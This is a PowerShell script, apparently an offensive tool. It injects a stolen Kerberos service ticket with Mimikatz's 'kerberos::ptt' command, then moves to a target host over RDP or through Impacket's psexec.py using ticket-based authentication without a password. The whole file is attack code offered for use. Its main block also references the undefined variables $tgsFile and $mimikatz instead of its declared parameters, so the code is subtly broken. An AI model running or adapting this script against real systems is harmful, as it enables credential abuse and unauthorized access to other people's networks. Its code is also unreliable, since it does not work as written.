param (
    [Parameter(Mandatory = $true)]
    [string]$u,         # Username switch (/u)

    [Parameter(Mandatory = $true)]
    [string]$t,   # Path to TGS .kirbi file (/t)

    [Parameter(Mandatory = $true)]
    [string]$m,  # Path to mimikatz.exe (/m)

    [Parameter(Mandatory = $false)]
    [string]$ip,        # Target IP for RDP (/ip)

    [Parameter(Mandatory = $false)]
    [string]$psexec,    # Path to Impacket's psexec.py (/psexec)

    [Parameter(Mandatory = $false)]
    [string]$domain,    # Domain name (/domain)

    [Parameter(Mandatory = $false)]
    [string]$psexecUser # PsExec username (/psexecUser)
)

# Function to Inject Kerberos Ticket with Mimikatz
function Invoke-PassTheTicket {
    param (
        [string]$TGSFilePath,
        [string]$MimikatzPath
    )

    # Run Mimikatz to inject the Kerberos TGS Ticket
    $mimikatzCommand = """kerberos::ptt $TGSFilePath"""
    Write-Host "Injecting TGS using Mimikatz..."

    # Run Mimikatz with the kerberos::ptt command
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $MimikatzPath
    $processInfo.Arguments = $mimikatzCommand
    $processInfo.RedirectStandardOutput = $true
    $processInfo.UseShellExecute = $false
    $processInfo.CreateNoWindow = $true

    $process = New-Object System.Diagnostics.Process
    $process.StartInfo = $processInfo
    $process.Start() | Out-Null
    $process.WaitForExit()

    # Capture and show Mimikatz output
    $output = $process.StandardOutput.ReadToEnd()
    Write-Host $output
}

# Function to Initiate RDP Connection
function Invoke-RDPConnection {
    param (
        [string]$TargetIP
    )

    Write-Host "Attempting RDP connection to $TargetIP..."
    mstsc /v:$TargetIP
}

# Function to Use Impacket's PsExec
function Invoke-PsExec {
    param (
        [string]$PsExecPath,
        [string]$Domain,
        [string]$User,
        [string]$TargetIP
    )

    $psexecCommand = "python3 $PsExecPath $User@$Domain -k -no-pass $TargetIP"
    Write-Host "Running PsExec: $psexecCommand"

    Start-Process "cmd.exe" -ArgumentList "/c $psexecCommand"
}

# Main Execution
Write-Host "Starting PtT for user: $u using TGS file: $tgsFile"

# Inject the TGS with Mimikatz
Invoke-PassTheTicket -TGSFilePath $tgsFile -MimikatzPath $mimikatz

# Check if RDP is required
if ($ip) {
    Invoke-RDPConnection -TargetIP $ip
}

# Check if PsExec is required
if ($psexec -and $domain -and $psexecUser) {
    Invoke-PsExec -PsExecPath $psexec -Domain $domain -User $psexecUser -TargetIP $ip
}
